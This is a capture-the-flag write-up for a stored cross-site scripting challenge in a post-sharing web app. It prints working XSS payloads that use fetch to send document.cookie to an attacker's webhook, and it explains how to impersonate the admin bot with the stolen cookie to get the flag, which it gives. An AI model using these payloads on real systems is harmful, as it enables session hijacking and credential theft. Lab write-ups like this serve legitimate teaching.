# GCB-August-2023 Writeup

A basic XSS challenge that requires you to steal an admins cookie and login as them to retrieve the flag.

## TLDR
A solve script has been provided at [solve.py](./solve.py).
1. Register an account and login
2. Setup a webhook to catch the admin bot's cookie
3. The "content" field is vulnerable to a [stored cross-site scripting attack](https://owasp.org/www-community/attacks/xss/)
4. You can verify this with: `<script>alert(1)</script>`, alternatively a safer payload would be: `<img src=x onerror=alert(1)>`
5. Force the admin bot to send a GET request to your webhook with their cookie: `<img src=x onerror=\"fetch('{webhook_url}?'+document.cookie)>`
6. Steal their cookie and impersonate them to get the flag via: `/flag`
7. Flag: GCB23{xsS_1s_4_5tr0ng_0n3_bb1607482bc177d5}

![solve.py](https://i.imgur.com/cxHfWM8.jpeg)

## Detailed Walkthrough

The website first brings us to the login page. On the nav-bar, you can see that we can register an account to login... so why not.

![](https://i.imgur.com/ANgVOGG.png)

After registering, we will be redirected to the login page again so simply just login.
We will be able to access the function of the website.

![](https://i.imgur.com/dINMDnc.png)

As seen, the platform enables us to craft and share posts. Furthermore, it is explicitly mentioned that an admin bot reviews all posts before approval. With this information, we are able to deduce that every once in a while (time not stated), there will be a user (in this case, a bot) with admin privileges, will view the posts that we create.

What is the first web app vulnerability you think of when you see textboxes? Cross-site Scripting right (XSS)????

Let's post special characters to see if the website filter any of them.

![](https://i.imgur.com/63JfrZF.png)

After submitting the post, we can view the post and verify that the website does not filter out any of the special characters that are use for XSS.

![](https://i.imgur.com/fWezaRC.png)

Now that we know there are no filtering, let's try to do a simple alert message.

![](https://i.imgur.com/WLAoBzS.png)

After submitting the post, an alert popped up. Now, we can confirm that this webpage is vulnerable to Stored XSS.

![](https://i.imgur.com/Ly5z8zI.png)

So, let's gather all the information we have currently.

1.  There is an admin bot that will look at our post on a regular time interval
2.  This webpage is vulnerable to Stored XSS

Since the adminbot checks the posts individually, this means that what ever payload we put in our XSS, the admin bot will execute it when it is checking.

However, up until now, the posts I have created still states that the posts have yet to been approve

![](https://i.imgur.com/4egWYQ3.png)

Before we craft the payload, let's take a look at the backend to have a deeper understanding on whats going on

![](https://i.imgur.com/fjCerLQ.png)

As you can see from the image above, on line 26, we can see that there is a filter for the content box
(Whenever there is a \\r\\n, \\r, or \\n type of line break in the content box, it will be replace with the HTML <br> tag)

This filter will not affect much for our payload.

By exploring the DevTools even further, we can see that the website uses cookie to authenticate us. hmm... if only we can get the cookie with admin privilege

![](https://i.imgur.com/RyEb6pN.png)

To help us get the admin-bot cookie using stored XSS on the post page, we will be using the open source website, webhook, to help us with the payload

![](https://i.imgur.com/ZZgLnsz.png)

After entering webhook, do copy your unique url

![](https://i.imgur.com/8c5Y8gL.png)

This is the payload I will be using "<script>fetch("webhook_url_here?c="+document.cookie, {method: "GET"})</script>"
(Do replace your webhook's unique url with webhook_url_here)

Let's break down the payload

- We will be using the 'fetch' API to make the HTTP GET request to the webhook url
- The document.cookie will be appended to it as well

This payload will send a GET request to the webhook URL and have the user's cookie (who is viewing the post) appended on it

Let's post this and let the admin bot view the post so we can steal it's cookie

![](https://i.imgur.com/lDfMXte.png)

After we submit the post, there should be an instant request with a token shown below. However, that is not the admin bot's cookie, it is ours.
(You can compare it with your cookie to verify)

![](https://i.imgur.com/Oa04dLG.png)

After waiting for a few more seconds, a new request was made

![](https://i.imgur.com/L6ua3Sl.png)

The cookie is different from our cookie... why not we try to login as them

Simply go back to your DevTools, go to application tab, and change your cookie with the stolen cookie

![](https://i.imgur.com/zOPLzeW.png)

Now, go back to the webpage and reload it. As you can see, we are now admin as it says 'Welcome adminbot'. Also, there is a 'Get Flag' option on the nav-bar

![](https://i.imgur.com/Dj6luaT.png)

Click on the 'Get Flag' option and you have found the flag!

![](https://i.imgur.com/WByW5zj.png)

`Flag: GCB23{xsS_1s_4_5tr0ng_0n3_bb1607482bc177d5}`

Hope you have learnt something new from GCB!!